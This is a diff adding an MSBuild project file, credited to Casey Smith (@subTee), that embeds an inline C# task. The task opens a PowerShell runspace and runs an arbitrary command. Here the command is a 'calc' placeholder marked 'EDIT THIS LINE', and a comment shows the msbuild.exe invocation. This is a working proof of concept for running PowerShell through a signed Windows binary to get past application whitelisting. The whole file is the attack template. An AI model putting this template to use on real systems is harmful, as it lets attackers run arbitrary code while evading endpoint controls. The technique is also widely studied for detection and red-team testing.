@@ -1,0 +1,70 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes c# code. -->
+  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe inline.xml -->
+  <!-- Author: Casey Smith, Twitter: @subTee -->
+  <!-- License: BSD 3-Clause -->
+<Target Name="calc">
+	<ClassExample />
+</Target>
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+			using System;
+			using System.IO;
+			using System.Diagnostics;
+			using System.Reflection;
+			using System.Runtime.InteropServices;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;
+
+			//Add For PowerShell Invocation
+			using System.Collections.ObjectModel;
+			using System.Management.Automation;
+			using System.Management.Automation.Runspaces;
+			using System.Text;
+
+			public class ClassExample :  Task, ITask
+			{
+				public override bool Execute()
+				{
+					try
+					{
+						//EDIT THIS LINE
+						Console.Write(RunPSCommand("calc"));
+					}
+					catch (Exception e)
+					{
+						Console.Write(e.Message);
+					}
+					return true;
+				}
+				
+				//Based on Jared Atkinson's And Justin Warner's Work
+				public static string RunPSCommand(string cmd)
+				{
+					Runspace runspace = RunspaceFactory.CreateRunspace();
+					runspace.Open();
+					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+					Pipeline pipeline = runspace.CreatePipeline();
+					pipeline.Commands.AddScript(cmd);
+					pipeline.Commands.Add("Out-String");
+					Collection<PSObject> results = pipeline.Invoke();
+					runspace.Close();
+					StringBuilder stringBuilder = new StringBuilder();
+					foreach (PSObject obj in results)
+					{
+						stringBuilder.Append(obj);
+					}
+					return stringBuilder.ToString().Trim();
+				 }
+			}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
